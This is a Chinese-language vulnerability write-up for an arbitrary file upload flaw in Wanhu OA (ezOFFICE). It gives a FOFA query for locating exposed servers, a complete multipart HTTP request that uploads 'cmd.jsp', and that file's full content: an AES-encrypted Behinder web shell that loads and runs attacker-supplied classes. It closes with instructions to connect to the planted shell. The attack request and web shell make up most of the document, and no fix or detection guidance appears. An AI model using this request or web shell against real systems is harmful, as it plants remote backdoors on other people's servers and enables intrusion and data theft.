# 万户OA fileUpload.controller 任意文件上传漏洞
## 漏洞描述
万户OA fileUpload.controller 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件
## 漏洞影响
```
万户OA
```
## 网络测绘
```
app="万户网络-ezOFFICE"
```
## 漏洞复现
产品页面
发送请求包上传文件
```php
POST /defaultroot/upload/fileUpload.controller HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Length: 773
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*......tas9er*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
```
使用冰蝎连接木马 **/defaultroot/upload/html/xxxxxxxxxx.jsp**
